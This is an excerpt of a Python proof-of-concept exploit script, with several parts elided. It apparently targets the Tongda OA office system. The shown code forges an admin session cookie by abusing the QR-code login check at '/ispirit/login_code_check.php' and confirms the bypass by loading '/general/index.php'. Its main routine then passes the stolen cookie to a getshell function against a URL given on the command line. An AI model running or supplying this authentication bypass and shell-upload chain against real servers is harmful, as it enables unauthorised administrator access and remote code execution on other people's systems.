...
def getV11Session(url):
    ...
    try:
        ...
        return re.findall('PHPSESSID=(.*?);', res.headers['Set-Cookie'])
    except:
        print('[153]Something Wrong With ' + url)
        return False
...
def get2017Session(url):
    ...
    try:
        ...
        res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(
            1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'}, headers=headers, timeout=3)
        resText = json.loads(res.text)
        status = resText['status']
        if status == str(1):
            getCodeUidUrl = url + '/ispirit/login_code_check.php?codeuid=' + codeUid
            res = requests.get(getCodeUidUrl, timeout=3)
            print('[+]Get Available COOKIE:' + res.headers['Set-Cookie'])
            return re.findall('PHPSESSID=(.*?);', res.headers['Set-Cookie'])
        else:
            print('[174]Something Wrong With ' + url + ' Maybe Not Vulnerable ?')
            return False
    except:
        print('[177]Something Wrong With ' + url)
        return False
...
def try_login(url):
    cookie = produce(url)[0]
    tmp = requests.get(url + '/general/index.php', cookies={'PHPSESSID': cookie}).text
    if ('未登录' in tmp):
        return False
    else:
        # cookie = produce(url)[0]
...
if __name__ == '__main__':
    ...
    parser.add_argument("-u", "--url", help="example python poc.py -u http://baidu.com")
    args = parser.parse_args()
    url = args.url.strip('/')
    if(cookie := try_login(url)):
        getshell(url, cookie)
